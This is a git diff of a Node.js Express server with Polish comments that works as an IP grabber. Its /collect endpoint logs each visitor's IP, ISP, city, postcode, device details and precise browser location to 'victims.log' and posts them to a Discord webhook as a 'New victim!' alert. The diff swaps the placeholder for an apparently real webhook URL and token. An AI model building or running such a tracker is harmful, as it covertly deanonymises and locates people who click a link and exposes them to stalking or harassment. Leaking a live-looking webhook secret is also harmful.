@@ -4,9 +4,9 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-// === KONFIGURACJA ===
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/TWOJE_ID/TWOJ_TOKEN'; // <--- WKLEJ SWÓJ WEBHOOK
-// ====================
+// === KONFIGURACJA DISCORD ===
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1534935200776327211/Xq6qX3_LhsiAaxdTcZPQ5KrQwgYrTzmxSJYHi1VuEroL0eh2wah8MJWVgV1lyHwy3C_v';
+// ============================
 
 app.post('/collect', async (req, res) => {
     const rawIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -16,7 +16,7 @@ app.post('/collect', async (req, res) => {
     data.ip = realIP;
     data.timestamp = new Date().toISOString();
 
-    // === POBIERZ GEOLOKALIZACJĘ Z IP ===
+    // Geolokalizacja
     let geo = {};
     try {
         const response = await fetch(`http://ip-api.com/json/${realIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`);
@@ -36,37 +36,25 @@ app.post('/collect', async (req, res) => {
         }
     } catch (e) { console.error('Błąd geolokalizacji:', e); }
 
-    // === POŁĄCZ WSZYSTKIE DANE ===
-    const fullData = {
-        ...data,
-        geo: geo,
-        // dodatkowe dane z nagłówków HTTP
-        headers: {
-            'user-agent': req.headers['user-agent'],
-            'accept-language': req.headers['accept-language'],
-            'referer': req.headers['referer'] || 'direct'
-        }
-    };
-
-    // === ZAPISZ DO PLIKU ===
+    const fullData = { ...data, geo, headers: { 'user-agent': req.headers['user-agent'], 'accept-language': req.headers['accept-language'], 'referer': req.headers['referer'] || 'direct' } };
     fs.appendFileSync('victims.log', JSON.stringify(fullData) + '\n');
     console.log(`Nowa ofiara: ${realIP} | ${geo.city || 'Nieznane miasto'}`);
 
-    // === WYŚLIJ NA DISCORD ===
+    // === WYSYŁKA NA DISCORD ===
     if (DISCORD_WEBHOOK.includes('discord.com')) {
         const embed = {
             embeds: [{
-                title: 'Nowa ofiara!',
+                title: '🔴 NOWA OFIARA!',
                 color: 0xff0000,
                 fields: [
-                    { name: 'IP', value: realIP, inline: true },
-                    { name: 'Miasto', value: geo.city || 'Brak', inline: true },
-                    { name: 'Kraj', value: geo.country || 'Brak', inline: true },
-                    { name: 'Kod pocztowy', value: geo.zip || 'Brak', inline: true },
-                    { name: 'ISP', value: geo.isp || 'Brak', inline: true },
-                    { name: 'System', value: data.userAgent || 'Brak', inline: true },
-                    { name: 'Ekran', value: data.screen || 'Brak', inline: true },
-                    { name: 'Geolokalizacja (dokładna)', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Brak zgody', inline: true },
+                    { name: '👤 IP', value: realIP, inline: true },
+                    { name: '📍 Miasto', value: geo.city || 'Brak', inline: true },
+                    { name: '🌍 Kraj', value: geo.country || 'Brak', inline: true },
+                    { name: '📮 Kod pocztowy', value: geo.zip || 'Brak', inline: true },
+                    { name: '🏢 ISP', value: geo.isp || 'Brak', inline: true },
+                    { name: '🖥️ System', value: data.userAgent || 'Brak', inline: true },
+                    { name: '📱 Ekran', value: data.screen || 'Brak', inline: true },
+                    { name: '🌐 Geolokalizacja (dokładna)', value: data.location ? `${data.location.lat}, ${data.location.lng}` : 'Brak zgody', inline: true },
                 ],
                 footer: { text: `Kliknięto: ${data.timestamp}` }
             }]
